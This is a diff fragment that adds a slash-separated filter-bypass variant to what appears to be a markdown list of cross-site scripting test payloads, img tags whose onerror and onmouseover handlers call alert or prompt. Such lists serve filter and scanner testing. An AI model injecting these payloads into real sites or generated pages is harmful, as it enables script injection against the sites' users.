@@ -5,4 +5,5 @@
 <img src=xss onerror=alert(1)>
 <img src =q onerror=prompt(8)>
 <IMG SRC=# onmouseover="alert('xss')">
+<img/src/onerror=alert(1)>
 ```
